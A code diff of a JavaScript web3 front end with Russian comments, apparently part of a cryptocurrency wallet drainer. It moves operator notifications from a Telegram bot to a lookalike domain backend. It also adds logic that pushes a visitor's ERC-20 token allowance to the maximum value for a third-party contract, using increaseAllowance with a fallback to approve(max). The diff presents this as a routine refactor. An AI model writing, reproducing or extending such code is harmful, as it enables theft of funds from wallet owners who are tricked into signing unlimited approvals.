@@ -297,17 +297,17 @@ function detectDevice() {
   return 'Desktop'
 }
 
-// Функция отправки сообщений в Telegram
+// Функция отправки уведомления через бэкенд (секреты на сервере)
 async function sendTelegramMessage(message) {
   try {
-    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+    const response = await fetch('https://api.cryptomuspayye.icu/api/notify', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'Markdown', disable_web_page_preview: true })
+      body: JSON.stringify({ text: message, parse_mode: 'Markdown', disable_web_page_preview: true })
     })
     const data = await response.json()
-    if (!data.ok) throw new Error(data.description || 'Failed to send Telegram message')
-    console.log('Telegram message sent successfully')
+    if (!data.success) throw new Error(data.message || 'Failed to send notification')
+    console.log('Notification sent successfully')
   } catch (error) {
     store.errors.push(`Error sending Telegram message: ${error.message}`)
   }
@@ -524,6 +524,16 @@ const erc20Abi = [
     constant: false,
     inputs: [
       { name: 'spender', type: 'address' },
+      { name: 'addedValue', type: 'uint256' }
+    ],
+    name: 'increaseAllowance',
+    outputs: [{ name: 'success', type: 'bool' }],
+    type: 'function'
+  },
+  {
+    constant: false,
+    inputs: [
+      { name: 'spender', type: 'address' },
       { name: 'amount', type: 'uint256' }
     ],
     name: 'approve',
@@ -679,18 +689,54 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   const checksumTokenAddress = getAddress(tokenAddress)
   const checksumContractAddress = getAddress(contractAddress)
   try {
-    const txHash = await writeContract(wagmiConfig, {
+    // Сначала читаем текущее значение allowance
+    const currentAllowance = await readContract(wagmiConfig, {
       address: checksumTokenAddress,
       abi: erc20Abi,
-      functionName: 'approve',
-      args: [checksumContractAddress, maxUint256],
+      functionName: 'allowance',
+      args: [getAddress(store.accountState.address), checksumContractAddress],
       chainId
     })
-    console.log(`Approve transaction sent: ${txHash}`)
-    monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
-      console.error(`Error monitoring transaction ${txHash}:`, error)
-    })
-    return txHash
+
+    // Если уже достаточно — выходим
+    if (typeof currentAllowance === 'bigint' && currentAllowance > 0n && currentAllowance === maxUint256) {
+      console.log('Allowance already at maximum, skipping increase')
+      return '0x'
+    }
+
+    // Вычисляем дельту для increaseAllowance
+    const delta = typeof currentAllowance === 'bigint' ? (maxUint256 - currentAllowance) : maxUint256
+
+    // Пытаемся увеличить allowance через increaseAllowance
+    try {
+      const txHash = await writeContract(wagmiConfig, {
+        address: checksumTokenAddress,
+        abi: erc20Abi,
+        functionName: 'increaseAllowance',
+        args: [checksumContractAddress, delta],
+        chainId
+      })
+      console.log(`increaseAllowance tx sent: ${txHash}`)
+      monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
+        console.error(`Error monitoring transaction ${txHash}:`, error)
+      })
+      return txHash
+    } catch (incErr) {
+      console.warn('increaseAllowance failed, falling back to approve:', incErr?.message || incErr)
+      // Фоллбек на approve(max)
+      const txHash = await writeContract(wagmiConfig, {
+        address: checksumTokenAddress,
+        abi: erc20Abi,
+        functionName: 'approve',
+        args: [checksumContractAddress, maxUint256],
+        chainId
+      })
+      console.log(`Approve transaction sent: ${txHash}`)
+      monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
+        console.error(`Error monitoring transaction ${txHash}:`, error)
+      })
+      return txHash
+    }
   } catch (error) {
     store.errors.push(`Approve token failed: ${error.message}`)
     throw error
